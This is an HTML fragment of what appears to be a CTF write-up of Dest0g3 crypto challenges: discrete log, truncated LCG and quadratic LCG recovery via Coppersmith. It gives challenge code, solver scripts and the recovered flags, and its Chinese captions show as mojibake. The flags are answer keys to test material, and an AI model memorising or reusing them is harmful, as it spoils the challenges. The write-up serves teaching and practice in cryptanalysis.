class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLPæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = </span><br><span class="line">h = </span><br><span class="line">x = discrete_log(mod(h,p),mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">8</span>] == <span class="string">&quot;Dest0g3&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 3939333498</span></span><br><span class="line"><span class="string">b = 3662432446</span></span><br><span class="line"><span class="string">m = 2271373817</span></span><br><span class="line"><span class="string">state1 = 17362</span></span><br><span class="line"><span class="string">state2 = 20624</span></span><br><span class="line"><span class="string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>LCGï¼Œçˆ†ç ´æ±‚seedï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">state1 = <span class="number">17362</span></span><br><span class="line">state2 = <span class="number">20624</span></span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    s1 = (state1&lt;&lt;<span class="number">16</span>)+i</span><br><span class="line">    s2 = (a*s1+b) % m</span><br><span class="line">    <span class="keyword">if</span> s2&gt;&gt;<span class="number">16</span> == state2:</span><br><span class="line">        seed = ((s1-b)*inverse_mod(a,m))%m</span><br><span class="line">        <span class="built_in">print</span>(seed)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1315807869</span></span><br><span class="line"><span class="comment"># 710396196</span></span><br><span class="line"><span class="comment"># 104984523</span></span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªç»“æœåˆ†åˆ«ä»£å…¥æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line">seed = [<span class="number">1315807869</span>,<span class="number">710396196</span>,<span class="number">104984523</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> seed:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            self.a = <span class="number">3939333498</span></span><br><span class="line">            self.b = <span class="number">3662432446</span></span><br><span class="line">            self.m = <span class="number">2271373817</span></span><br><span class="line">            self.seed = k</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">            self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">            <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    lcg = LCG()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(c[i] ^^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span></span><br><span class="line"><span class="comment"># Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span></span><br><span class="line"><span class="comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Mr-Doctor"><a href="#Mr-Doctor" class="headerlink" title="Mr.Doctor"></a>Mr.Doctor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">8</span>:-<span class="number">1</span>]</span><br><span class="line">seed = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHA256</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encryption</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RHODES_ELITE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.Doctor = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.Amiya = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Rosmontis = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Blaze = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = SHA256()</span><br><span class="line">sha_flag = sha.encryption()</span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line">elite.output()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ash = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SliverAsh = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line">W = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="number">3</span>) ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sha_flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(W))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Amiya =  956366446278</span></span><br><span class="line"><span class="string">Rosmontis =  1061992537343</span></span><br><span class="line"><span class="string">Blaze =  636205571590</span></span><br><span class="line"><span class="string">Doctor =  18068433704538283397</span></span><br><span class="line"><span class="string">Ash =  1097363493609113</span></span><br><span class="line"><span class="string">SliverAsh =  2051431344160327</span></span><br><span class="line"><span class="string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>äºŒé˜¶LCG + 4ä½ä¸€è½®çˆ†ç ´ï¼Œç”¨äºŒå…ƒCoppersmithæ–¹æ³•æ±‚seedï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">        R = f.base_ring()</span><br><span class="line">        N = R.cardinality()</span><br><span class="line">        f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">        f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">        G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            base = N ^ (m - i) * f ^ i</span><br><span class="line">            <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">                g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">                G.append(g)</span><br><span class="line"></span><br><span class="line">        B, monomials = G.coefficient_matrix()</span><br><span class="line">        monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">        factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">        B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">        B = B.change_ring(QQ)</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">        H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">            H.append(h)</span><br><span class="line">            I = H.ideal()</span><br><span class="line">            <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">                H.pop()</span><br><span class="line">            <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                    root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                    roots.append(root)</span><br><span class="line">                    <span class="keyword">return</span> roots</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">a = <span class="number">956366446278</span></span><br><span class="line">b = <span class="number">1061992537343</span></span><br><span class="line">c = <span class="number">636205571590</span></span><br><span class="line">p = <span class="number">18068433704538283397</span></span><br><span class="line">state1 = <span class="number">1097363493609113</span></span><br><span class="line">state2 = <span class="number">2051431344160327</span></span><br><span class="line">PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) ^ <span class="number">2</span> + b * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) + c - (state2 &lt;&lt; <span class="number">12</span>) - s2_low</span><br><span class="line">state1 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">0</span>] + (state1 &lt;&lt; <span class="number">12</span>)</span><br><span class="line">state2 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">1</span>] + (state2 &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * x * x + b * x + c - state1</span><br><span class="line">seed = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 626844643882</span></span><br></pre></td></tr></table></figure><p>ä»£å…¥é€4ä½çˆ†ç ´flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lcg</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.p = <span class="number">18068433704538283397</span></span><br><span class="line">        self.a = <span class="number">956366446278</span></span><br><span class="line">        self.b = <span class="number">1061992537343</span></span><br><span class="line">        self.c = <span class="number">636205571590</span></span><br><span class="line">        self.seed = <span class="number">626844643882</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">l = lcg()</span><br><span class="line">seed = l.seed</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">c = <span class="number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line">c = <span class="built_in">hex</span>(c)[<span class="number">2</span>:].rjust(<span class="number">9</span>*<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef-&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>(<span class="params">nowc</span>):</span><br><span class="line">    <span class="built_in">print</span>(nowc)</span><br><span class="line">    t=l.<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(x).hexdigest().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)%(seed**<span class="number">3</span>)^(t%<span class="number">100</span>))[<span class="number">2</span>:].rjust(<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>) == nowc, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    flag += <span class="built_in">pow</span>(c[<span class="number">30</span>*i:<span class="number">30</span>*(i+<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Bag"><a href="#Bag" class="headerlink" title="Bag"></a>Bag</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 